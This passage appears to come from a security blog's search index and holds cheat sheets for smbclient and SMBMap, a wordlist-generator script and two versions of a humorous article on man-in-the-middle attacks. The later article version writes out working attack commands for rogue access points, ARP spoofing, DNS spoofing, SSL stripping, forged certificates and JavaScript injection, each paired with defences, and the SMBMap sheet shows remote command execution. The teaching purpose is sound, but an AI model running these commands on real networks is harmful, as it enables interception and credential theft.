radar.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003erev2self\u003c/code\u003e\u003c/strong\u003e: Revert privileges to the original user (a \u0026ldquo;reset button\u0026rdquo; for when things get weird).\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"file-system-commands\"\u003eFile System Commands\u003c/h2\u003e\n\u003cp\u003eFor poking around the file system:\u003c/p\u003e","title":"Meterpreter"},{"content":"smbclient is a command-line tool that allows you to interact with SMB (Server Message Block) file shares. Whether you’re uploading files, listing directories, or troubleshooting network shares, this tool is your go-to for SMB.\nBasic Usage To connect to an SMB file share, use the following syntax:\nsmbclient //server/share [options] Replace server with the hostname or IP address of the server hosting the file share. Replace share with the name of the file share. Once connected, you will be prompted for credentials. After successful authentication, a command prompt will allow you to interact with the share.\nCommon Options -U \u0026lt;username\u0026gt;: Specify the username to use for authentication. -W \u0026lt;workgroup\u0026gt;: Specify the domain or workgroup. -I \u0026lt;IP address\u0026gt;: Directly specify the server\u0026rsquo;s IP address. -p \u0026lt;port\u0026gt;: Specify the port (default is 445). -d \u0026lt;debug level\u0026gt;: Set the debug level for verbose output. -N: Suppress the password prompt (useful for guest accounts). Available Commands Once connected, the following commands allow you to interact with the file share:\nls: List files and directories in the current directory. cd \u0026lt;directory\u0026gt;: Change to a different directory. pwd: Print the current working directory. put \u0026lt;file\u0026gt;: Upload a file to the share. get \u0026lt;file\u0026gt;: Download a file from the share. mput \u0026lt;files\u0026gt;: Upload multiple files. mget \u0026lt;files\u0026gt;: Download multiple files. rm \u0026lt;file\u0026gt;: Delete a file. mkdir \u0026lt;directory\u0026gt;: Create a new directory. rmdir \u0026lt;directory\u0026gt;: Remove a directory. exit: Disconnect from the share and exit smbclient. Examples List Files in a Share smbclient //server/share -c ls Connect with a Specific Username and Password smbclient //server/share -U username%password Connect Using an IP Address and Port smbclient //server/share -I 192.168.1.100 -p 139 Upload a File smbclient //server/share -c \u0026#34;put /path/to/local/file\u0026#34; Download a File smbclient //server/share -c \u0026#34;get /path/to/remote/file\u0026#34; Create a New Directory smbclient //server/share -c \u0026#34;mkdir newdirectory\u0026#34; When to Use smbclient Quick Access: Need to interact with a file share without mounting it? smbclient gives you immediate access. Testing Permissions: Check which directories and files are accessible under different credentials. File Operations: Download, upload, or manage files on SMB shares. Debugging: Troubleshoot network shares with verbose output using -d. Final Thoughts smbclient is a powerful yet straightforward tool for interacting with SMB shares. Whether you’re performing quick tests or conducting audits, it streamlines tasks that would otherwise require mounting shares. Keep this cheat sheet handy for quick reference and efficient file share management!\n","permalink":"http://localhost:1313/cheat-sheets/smbclient/","summary":"\u003cp\u003e\u003cstrong\u003esmbclient\u003c/strong\u003e is a command-line tool that allows you to interact with SMB (Server Message Block) file shares. Whether you’re uploading files, listing directories, or troubleshooting network shares, this tool is your go-to for SMB.\u003c/p\u003e\n\u003ch2 id=\"basic-usage\"\u003eBasic Usage\u003c/h2\u003e\n\u003cp\u003eTo connect to an SMB file share, use the following syntax:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbclient //server/share \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eoptions\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eReplace \u003cstrong\u003e\u003ccode\u003eserver\u003c/code\u003e\u003c/strong\u003e with the hostname or IP address of the server hosting the file share.\u003c/li\u003e\n\u003cli\u003eReplace \u003cstrong\u003e\u003ccode\u003eshare\u003c/code\u003e\u003c/strong\u003e with the name of the file share.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eOnce connected, you will be prompted for credentials. After successful authentication, a command prompt will allow you to interact with the share.\u003c/p\u003e","title":"smbclient"},{"content":"SMBMap is a command-line tool for enumerating and interacting with SMB shares. It allows you to execute commands, upload/download files, and assess permissions effectively.\nBasic Syntax smbmap -u \u0026lt;username\u0026gt; -p \u0026lt;password\u0026gt; -H \u0026lt;host\u0026gt; [options] Common Usage Examples Connect with Null Password smbmap -u guest -p \u0026#34;\u0026#34; -d . -H 192.168.1.1 Connect as Admin with Password smbmap -u admin -p password123 -d . -H 192.168.1.1 Execute a Command smbmap -u admin -p password123 -d . -H 192.168.1.1 -x \u0026#39;ipconfig\u0026#39; Connect to a Specific Drive smbmap -u admin -p password123 -d . -H 192.168.1.1 -r \u0026#39;C$\u0026#39; Upload a File smbmap -u admin -p password123 -d . -H 192.168.1.1 --upload \u0026#39;/path/to/file.txt\u0026#39; \u0026#39;C$\\file.txt\u0026#39; Download a File smbmap -u admin -p password123 -d . -H 192.168.1.1 --download \u0026#39;C$\\file.txt\u0026#39; Enumerate a Specific Share smbmap -H 192.168.1.1 -s \u0026#39;share_name\u0026#39; Enumerate Users smbmap -H 192.168.1.1 --users Key Options -u \u0026lt;username\u0026gt;: Specify the username. -p \u0026lt;password\u0026gt;: Specify the password. -H \u0026lt;host\u0026gt;: Specify the target host. -r \u0026lt;share\u0026gt;: Connect to a specific share or drive. -x \u0026lt;command\u0026gt;: Execute a command on the target. --upload \u0026lt;local_file\u0026gt; \u0026lt;remote_path\u0026gt;: Upload a file to the target. --download \u0026lt;remote_file\u0026gt;: Download a file from the target. -s \u0026lt;share\u0026gt;: Enumerate a specific share. --users: Enumerate users on the target. -R: Check for shares with full permissions. -p \u0026lt;port\u0026gt;: Specify a port. When to Use SMBMap Permission Audits: Quickly identify shares with read, write, or full access permissions. Command Execution: Execute remote commands on accessible shares. File Transfers: Upload or download files directly from SMB shares. User Enumeration: Discover user accounts configured on the target system. Final Thoughts SMBMap is an efficient and user-friendly tool for SMB enumeration and interaction. Its flexibility makes it ideal for penetration testing and auditing SMB shares. Keep this cheat sheet handy to streamline your workflows.\n","permalink":"http://localhost:1313/cheat-sheets/smbmap/","summary":"\u003cp\u003e\u003cstrong\u003eSMBMap\u003c/strong\u003e is a command-line tool for enumerating and interacting with SMB shares. It allows you to execute commands, upload/download files, and assess permissions effectively.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u \u0026lt;username\u0026gt; -p \u0026lt;password\u0026gt; -H \u0026lt;host\u0026gt; \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eoptions\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-usage-examples\"\u003eCommon Usage Examples\u003c/h2\u003e\n\u003ch3 id=\"connect-with-null-password\"\u003eConnect with Null Password\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u guest -p \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e -d . -H 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"connect-as-admin-with-password\"\u003eConnect as Admin with Password\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"execute-a-command\"\u003eExecute a Command\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 -x \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ipconfig\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"connect-to-a-specific-drive\"\u003eConnect to a Specific Drive\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 -r \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;C$\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"upload-a-file\"\u003eUpload a File\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 --upload \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;/path/to/file.txt\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;C$\\file.txt\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"download-a-file\"\u003eDownload a File\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 --download \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;C$\\file.txt\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-a-specific-share\"\u003eEnumerate a Specific Share\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -H 192.168.1.1 -s \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;share_name\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-users\"\u003eEnumerate Users\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -H 192.168.1.1 --users\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"key-options\"\u003eKey Options\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-u \u0026lt;username\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the username.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;password\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the password.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-H \u0026lt;host\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the target host.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-r \u0026lt;share\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Connect to a specific share or drive.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-x \u0026lt;command\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Execute a command on the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--upload \u0026lt;local_file\u0026gt; \u0026lt;remote_path\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Upload a file to the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--download \u0026lt;remote_file\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Download a file from the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-s \u0026lt;share\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Enumerate a specific share.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--users\u003c/code\u003e\u003c/strong\u003e: Enumerate users on the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-R\u003c/code\u003e\u003c/strong\u003e: Check for shares with full permissions.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;port\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify a port.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"when-to-use-smbmap\"\u003eWhen to Use SMBMap\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003ePermission Audits\u003c/strong\u003e: Quickly identify shares with read, write, or full access permissions.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCommand Execution\u003c/strong\u003e: Execute remote commands on accessible shares.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eFile Transfers\u003c/strong\u003e: Upload or download files directly from SMB shares.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eUser Enumeration\u003c/strong\u003e: Discover user accounts configured on the target system.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"final-thoughts\"\u003eFinal Thoughts\u003c/h2\u003e\n\u003cp\u003eSMBMap is an efficient and user-friendly tool for SMB enumeration and interaction. Its flexibility makes it ideal for penetration testing and auditing SMB shares. Keep this cheat sheet handy to streamline your workflows.\u003c/p\u003e","title":"SMBMap"},{"content":"Sometimes you just need a clean wordlist without the frills of a complicated tool. That’s where this Wordlist Generator comes in. It’s a simple Bash script designed to pull unique words from one or more text files, sort them, and save them neatly into a wordlist. Whether you’re prepping for a dictionary attack, building a natural language dataset, or just satisfying your curiosity, this script gets the job done quickly and efficiently.\nWhy Bash? You might be asking, why Bash? Well, there’s beauty in simplicity. This script was created to strip down the task to its essentials: no dependencies, no extra fuss, just the native power of Bash. While there are plenty of tools out there for generating wordlists, this one leans into the Unix philosophy—do one thing, and do it well.\nHow It Works The script takes one or more text files as input, extracts the words, normalizes them to lowercase, removes duplicates, sorts them, and outputs everything into a file called wordlist.txt. The end result? A clean, ordered list of unique words ready for your next project.\nKey Features Simple Input: Accepts multiple text files as input. Automatic Sorting: Ensures the wordlist is alphabetically ordered. No Dependencies: Works out of the box with any modern Bash shell. Efficiency: Processes files with a single command pipeline. Getting Started Installation Just grab the script at the bottom of this page, make it executable, and you’re good to go. Or you can get it on my github :\ngit clone https://github.com/noobosaurus-r3x/Wordlister cd Wordlister chmod +x wordlister.sh Usage The script is designed to be intuitive and easy to use. Here’s the basic syntax:\n./wordlister.sh file1.txt file2.txt file3.txt What It Does Combines the contents of all provided text files. Extracts words by splitting on non-alphanumeric characters. Converts all words to lowercase to avoid duplicates like Word and word. Removes duplicates entirely. Outputs the results into wordlist.txt in the current directory. Example Imagine you have two text files, file1.txt and file2.txt, and you want to generate a wordlist:\nRun the script:\n./wordlister.sh file1.txt file2.txt The script processes the files and outputs:\nCreated wordlist with 500 words Open wordlist.txt to see your results.\nNotes If no files are provided, the script will display a usage message and exit. The output file is overwritten each time the script runs, so be sure to back up your previous wordlists if needed. The Script For those who want a peek under the hood, here’s the full script:\n#!/usr/bin/env bash set -euo pipefail IFS=$\u0026#39;\\n\\t\u0026#39; if [ $# -eq 0 ]; then echo \u0026#34;Usage: $0 \u0026lt;text_file1\u0026gt; [\u0026lt;text_file2\u0026gt; ...]\u0026#34; exit 1 fi wordlist=\u0026#34;wordlist.txt\u0026#34; # Process input files to extract unique words in lowercase LC_ALL=C cat \u0026#34;$@\u0026#34; \\ | tr -c \u0026#39;[:alnum:]\u0026#39; \u0026#39;\\n\u0026#39; \\ | tr \u0026#39;[:upper:]\u0026#39; \u0026#39;[:lower:]\u0026#39; \\ | sort -u \u0026gt; \u0026#34;$wordlist\u0026#34; word_count=$(wc -l \u0026lt; \u0026#34;$wordlist\u0026#34;) echo \u0026#34;Created wordlist with $word_count words\u0026#34; Why Use This Script? If you need a no-nonsense way to generate a wordlist, this script has you covered. It’s lightweight, fast, and doesn’t require any external tools or libraries. Whether you’re working in cybersecurity, natural language processing, or simply organizing your text data, this Bash script is a reliable companion.\nFinal Thoughts Sometimes the simplest tools are the most effective. This wordlist generator isn’t trying to be fancy; it’s just trying to do the job—and it does it well. If you’ve got improvements or ideas, feel free to tweak the script to fit your needs. After all, the best tools are the ones you make your own.\n","permalink":"http://localhost:1313/tools/wordlister/","summary":"\u003cp\u003eSometimes you just need a clean wordlist without the frills of a complicated tool. That’s where this \u003cstrong\u003eWordlist Generator\u003c/strong\u003e comes in. It’s a simple Bash script designed to pull unique words from one or more text files, sort them, and save them neatly into a wordlist. Whether you’re prepping for a dictionary attack, building a natural language dataset, or just satisfying your curiosity, this script gets the job done quickly and efficiently.\u003c/p\u003e","title":"Wordlister"},{"content":"MITM Attacks: How to Crash the Party Between Alice and Bob Man-in-the-Middle attacks (MITM) are like showing up uninvited to someone else’s private conversation, grabbing a chair, and whispering, “Don’t mind me.” Except, instead of tea and gossip, the stakes are passwords, credit card numbers, and all the juicy secrets your data holds. In this article, we’ll explore how MITM attackers eavesdrop, meddle, and occasionally set fire to the whole chat—all while pretending to be invisible.\nWelcome to the shady world of MITM. Pack your paranoia; you’re going to need it.\nWhat Even Is a Man-in-the-Middle Attack? Picture Alice and Bob texting. They think they’re alone, sharing secrets, memes, or sweet nothings. But lurking between them is Carol, reading and occasionally tweaking their messages. Alice sends, “Meet me at 3,” and Bob receives, “Meet me at 5. Bring cash.” Smooth move, Carol.\nNow apply this concept to your internet traffic. Carol isn’t some nosy neighbor; she’s intercepting data as it zips between your device and the server. From coffee shop Wi-Fi to your office LAN, MITM attacks thrive wherever trust is a little too generous.\nCommon MITM Party Tricks 1. Rogue Wi-Fi Access Points You’ve seen them: “Free_Cafe_WiFi” or “Starbux_Guest.” They’re traps, plain and simple. Once you connect, every packet you send goes through Carol’s rogue router, where she’s free to read, steal, or plant malware. Oh, and she’s doing this with a latte in hand, probably. 2. ARP Spoofing Remember ARP (Address Resolution Protocol)? It’s the thing that maps IP addresses to MAC addresses. ARP spoofing is like yelling, “Hey, I’m the router now!” on a local network. Devices believe it, send all traffic to the imposter, and Carol gets a front-row seat.\n3. DNS Spoofing You type bank.com, expecting to check your balance. Instead, you’re redirected to a pixel-perfect fake site hosted by Carol. You log in, and BAM—she’s got your credentials. Meanwhile, you’re wondering why the “security” questions involve your least favorite vegetable.\n4. SSL Stripping You’re heading to an HTTPS site—encrypted, secure, all good. But Carol intercepts the request, downgrades it to HTTP, and forwards it to the server. You’re now transmitting sensitive data unencrypted, and Carol’s sitting there, gleefully recording it all. 5. HTTPS Spoofing This is where Carol pulls out her best con artist moves. Using a fake SSL certificate, she tricks your browser into thinking her malicious site is legit. You’re happily browsing, clicking, and entering credentials, completely unaware that Carol is logging every keystroke. Your browser’s padlock might even show green, but behind the scenes, it’s all smoke and mirrors. Cryptography: A Love-Hate Relationship Symmetric vs. Asymmetric Crypto In symmetric cryptography, both parties share the same key—great for speed, terrible for security if Carol grabs that key. Asymmetric cryptography introduces a public-private key pair. Alice encrypts with Bob’s public key, and Bob decrypts with his private key. Sounds secure, right? Enter Carol.\nThe MITM Twist Carol intercepts Bob’s public key and replaces it with her own. Alice encrypts the message with Carol’s public key, thinking it’s Bob’s. Carol decrypts it, reads it, and re-encrypts it with Bob’s real key. Bob never suspects a thing, and Carol now knows way too much about their dinner plans. How MITM Looks in the Wild Here’s where MITM gets creative—and terrifying:\nWi-Fi Free-for-All: Public hotspots are MITM’s playground. Your laptop’s “secure” data exchange? Not so much. IoT Intrigue: Your smart fridge isn’t just emailing recipes—it’s chatting with servers worldwide. A MITM attack could intercept and compromise your entire IoT network. Corporate Espionage: On an office network, intercepting data between employees and servers can leak sensitive projects or financial information faster than you can say “phishing scam.” Defending Yourself: Build the Fort Carol’s antics aren’t unstoppable. Here’s how to fight back:\n1. Encrypt Everything No encryption, no security. Use protocols like TLS 1.3, and ensure your connections are HTTPS-only. HSTS (HTTP Strict Transport Security) forces browsers to avoid HTTP entirely.\n2. Verify Certificates That padlock icon in your browser? Click it. Double-check the SSL/TLS certificate. If something seems off, bail out.\n3. Avoid Public Wi-Fi Unless you’ve got a VPN, steer clear of free Wi-Fi. If you absolutely must connect, treat it like a sketchy handshake—brief and cautious.\n4. Deploy Multi-Factor Authentication (MFA) Even if Carol steals your password, she’ll hit a wall when the second factor kicks in—like a fingerprint or app-based code.\n5. Monitor Your Network Tools like Wireshark can reveal ARP spoofing or suspicious DNS activity. Pro tip: if you see two devices claiming the same IP address, someone’s playing dirty.\nThe Tools of the Trade: MITM Detectives Want to be a digital Sherlock? Here are your magnifying glasses:\nWireshark: For sniffing traffic and spotting anomalies. Snort/Suricata: Intrusion detection systems that scream “MITM alert!” when something’s off. VPNs: Encrypt traffic at the source. Even Carol will have a hard time cracking this. Final Thought (For Now) Man-in-the-Middle attacks are part technical wizardry, part digital con artistry. They’re clever, sneaky, and undeniably fascinating. The more you learn, the more you’ll spot the Carols of the cyber world—and stop them dead in their tracks.\nBut hey, this is just the beginning. Next time, we’ll go deeper into the world of packet manipulation, rogue access points, and how to outwit even the most cunning attackers. Until then, stay encrypted, stay vigilant, and for the love of TCP, stay out of “Totally_Real_Free_WiFi” networks.\n","permalink":"http://localhost:1313/articles/mitm_crash_a_party/","summary":"\u003ch1 id=\"mitm-attacks-how-to-crash-the-party-between-alice-and-bob\"\u003eMITM Attacks: How to Crash the Party Between Alice and Bob\u003c/h1\u003e\n\u003cp\u003eMan-in-the-Middle attacks (MITM) are like showing up uninvited to someone else’s private conversation, grabbing a chair, and whispering, “Don’t mind me.” Except, instead of tea and gossip, the stakes are passwords, credit card numbers, and all the juicy secrets your data holds. In this article, we’ll explore how MITM attackers eavesdrop, meddle, and occasionally set fire to the whole chat—all while pretending to be invisible.\u003c/p\u003e","title":""},{"content":"MITM Attacks: How to Crash the Party Between Alice and Bob Man-in-the-Middle attacks (MITM) are like showing up uninvited to someone else’s private conversation, grabbing a chair, and whispering, “Don’t mind me.” Except, instead of tea and gossip, the stakes are passwords, credit card numbers, and the little details your digital life holds. Carol—the uninvited hacker—isn’t just listening; she’s reading, stealing, and sometimes tweaking what’s being said.\nToday, we’ll crash this party and take a look at how Carol pulls off her tricks, why they work, and what you can do to stop her from making herself at home in your traffic.\nWhat Even Is a Man-in-the-Middle Attack? Picture this: Alice and Bob are exchanging secrets—love letters, memes, bank details, or maybe just complaining about Carol. They think they’re communicating directly, but little do they know, Carol is sitting in the middle, reading every word, tweaking the conversation, and cackling like a villain in a bad spy movie.\nIn the digital world, Alice could be your laptop, Bob a website or server, and Carol a hacker lurking on your café’s Wi-Fi or corporate network. She intercepts traffic, decrypts it (sometimes), and messes with it however she pleases.\nThe terrifying part? This can happen to you without you realizing it—until it’s too late.\nHow Carol Crashes the Party: Common MITM Tricks Carol’s bag of tricks is stuffed with clever (and sometimes shockingly simple) ways to hijack your traffic. Here’s how she pulls it off:\n1. Rogue Wi-Fi Access Points: Carol’s Favorite Honeytrap Setting up a rogue Wi-Fi access point doesn’t require much more than a laptop, a coffee shop corner, and a catchy SSID like Free_Cafe_WiFi or Starbux_Free. You think you’re connecting to free Wi-Fi for your overpriced latte, but you’re actually walking straight into Carol’s trap.\nHow It Works (The Tech Bit): Broadcast the Trap: Carol uses tools like Airbase-ng to create a fake access point. airbase-ng -e \u0026#34;Starbux_Guest\u0026#34; -c 6 wlan0mon Monitor the Victims: Your device connects, trusting the familiar name. Carol now acts as the gateway to the internet. Proxy the Traffic: With tools like ettercap or mitmproxy, Carol routes all your traffic through her machine. She can sniff, modify, or inject malware at will. bettercap -T -q -M arp:remote // // -i wlan0 Optional Evil Fun: Carol can inject JavaScript keyloggers, replace downloads with malware, or redirect DNS queries to phishing pages. Why It’s Effective Devices love auto-connecting to networks they recognize, and humans… well, we love free Wi-Fi.\nDefense Tip: Always use a VPN. It wraps your data in encryption, making Carol’s snooping session as useful as watching a scrambled TV channel from the 90s.\n2. ARP Spoofing: “Hi, I’m the Router Now” ARP (Address Resolution Protocol) is like the phonebook for local networks, mapping IP addresses to MAC addresses. But ARP has a fatal flaw: it trusts everyone. Carol exploits this blind trust to impersonate the router and redirect all traffic through herself.\nHow It Works: Carol tells the router: “Hey, I’m Alice.” Carol tells Alice: “Hey, I’m the router.” Traffic meant for Alice or the router now flows through Carol. arpspoof -i eth0 -t 192.168.1.10 -r 192.168.1.1 Why It’s Effective On a LAN, ARP spoofing is lightning-fast and stealthy. Carol can:\nSniff unencrypted traffic with Wireshark. Modify requests in real time. Drop packets because chaos is fun. The Tell: On compromised machines, running arp -a often exposes duplicate MAC addresses—a sign Carol’s in the mix.\nDefense Tip: Use ARP detection tools like Arpwatch or enable Dynamic ARP Inspection (DAI) on managed switches.\n3. DNS Spoofing: Carol’s Redirection Magic You type bank.com into your browser. Carol decides that’s cute and redirects you to fak3bank.com—a malicious clone where she harvests your login details.\nHow It Works: Carol intercepts DNS requests (via tools like tcpdump): tcpdump -i eth0 udp port 53 She injects a fake DNS response faster than the real DNS server: dnsspoof -i eth0 -f dns_hosts Example dns_hosts file: 133.7.133.7 google.com You land on Carol’s server, which looks real enough for you to log in like a good, oblivious citizen. Defense Tip: Use DNSSEC to validate DNS responses and encrypt queries with DNS-over-HTTPS (DoH).\n4. SSL Stripping: Downgrading You Back to 2005 You know HTTPS—the comforting padlock in your browser bar? Carol strips it away like a magician revealing a trapdoor.\nHow It Works: You type https://example.com. Carol intercepts and strips the HTTPS headers, forcing a plain old HTTP connection. Everything—passwords, credit card info, embarrassing searches—travels unencrypted. bettercap -iface eth0 -caplet https-ui Carol logs it all. The tiny missing s in HTTPS becomes the gateway to your digital life.\nDefense Tip: Use HSTS (HTTP Strict Transport Security) and browser extensions like HTTPS Everywhere to force secure connections.\n5. HTTPS Spoofing: Fake Certificates, Real Problems If SSL stripping is a blunt hammer, HTTPS spoofing is a precision scalpel. Carol doesn’t remove encryption—she fakes it.\nHow It Works: Carol generates a self-signed SSL certificate to impersonate a legitimate server: openssl req -new -x509 -keyout fakekey.pem -out fakecert.pem She intercepts the connection, swapping the real SSL cert for her fake one. Your browser thinks it’s secure (padlock and all), and Carol decrypts everything. Why It Works Most people trust the padlock icon without ever inspecting the certificate details.\nDefense Tip: Use certificate pinning to reject impostor certificates and manually verify SSL certificates for sensitive services.\nMITM Isn’t Just Eavesdropping—It’s Total Manipulation MITM doesn’t stop at listening. Carol can inject malware, redirect you to phishing sites, or swap out legitimate downloads with compromised files. She can even inject JavaScript into HTTP traffic to keylog everything you type. Tools like Bettercap make this child’s play:\nbettercap -iface eth0 -caplet js-inject Final Thoughts: How to Keep Carol Out MITM attacks exploit trust—trust in open networks, unverified certificates, or unsecured protocols. But with a few defenses, you can kick Carol out of the party:\nAlways use a VPN on public networks. Enable HSTS, DNSSEC, and encrypted DNS (DoH/DoT). Inspect SSL certificates, especially on critical services. Watch for anomalies: duplicate MAC addresses, suspicious DNS redirects, or missing HTTPS. In short: trust no one, especially not the Wi-Fi named Free_Cafe_WiFi. Carol’s out there, latte in hand, waiting for you to slip up. Don’t give her the satisfaction.\n","permalink":"http://localhost:1313/articles/mitm_crash_a_party/","summary":"\u003ch1 id=\"mitm-attacks-how-to-crash-the-party-between-alice-and-bob\"\u003e\u003cstrong\u003eMITM Attacks: How to Crash the Party Between Alice and Bob\u003c/strong\u003e\u003c/h1\u003e\n\u003cp\u003eMan-in-the-Middle attacks (MITM) are like showing up uninvited to someone else’s private conversation, grabbing a chair, and whispering, \u003cem\u003e“Don’t mind me.”\u003c/em\u003e Except, instead of tea and gossip, the stakes are passwords, credit card numbers, and the little details your digital life holds. Carol—the uninvited hacker—isn’t just listening; she’s reading, stealing, and sometimes \u003cem\u003etweaking\u003c/em\u003e what’s being 